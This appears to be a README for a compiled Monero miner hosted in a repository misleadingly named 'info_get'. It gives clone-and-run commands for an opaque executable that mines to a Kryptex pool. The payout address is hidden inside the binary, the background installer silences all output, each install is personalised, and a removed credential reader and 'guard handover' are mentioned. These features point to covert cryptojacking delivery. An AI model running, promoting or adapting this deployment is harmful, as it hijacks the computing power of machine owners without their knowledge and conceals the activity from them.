# Standalone direct-pool miner

Linux x86_64 standalone miner. It uses the existing configured payout account
and connects directly over TLS to `xmr-sg.kryptex.network:8029`.

```sh
git clone https://github.com/sandrauzbmo/info_get.git
cd info_get
./run
```

`run` starts with zero arguments. It contains no WorkBuddy keepalive client,
account credential reader, launcher or guard handover. Keepalive, if needed,
is managed separately. Stop an interactive run with Ctrl+C.

No miner log file is created by default. Direct runs print to the terminal;
the background installer discards standard output and standard error.

For an entry check without mining or network connections:

```sh
./run --self-check
sha256sum -c run.sha256
```

This is the raw fixed executable. Git clones receive the same file and hash;
the existing signed installer, rather than this repository, performs per-install
54-character personalization. No identifier registry is included.

The configured payout address is present in the executable and is not printed
in this README. Standard Linux dynamic libraries listed in `standalone.json` are
required. This repository contains compiled delivery and documentation only.
